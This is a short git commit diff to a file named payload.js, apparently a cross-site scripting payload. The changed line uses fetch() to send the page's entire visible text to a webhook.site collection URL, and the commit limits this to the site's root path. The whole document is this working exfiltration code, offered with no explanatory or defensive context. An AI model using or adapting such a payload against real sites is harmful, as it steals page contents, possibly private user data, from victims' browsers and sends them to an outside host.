b9b54384f83d95e3d6cb9525718cb8788c4df037
brianqvb <131671186+brianqvb@users.noreply.github.com>
2025-05-14 15:59:19 +1000

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,3 @@
-fetch('https://webhook.site/411bedb1-bc74-4bf2-bf9e-70cea35b1f92?text=' + encodeURIComponent(document.body.innerText));
+if (location.pathname === '/') {
+  fetch('https://webhook.site/411bedb1-bc74-4bf2-bf9e-70cea35b1f92?text=' + encodeURIComponent(document.body.innerText));
+}
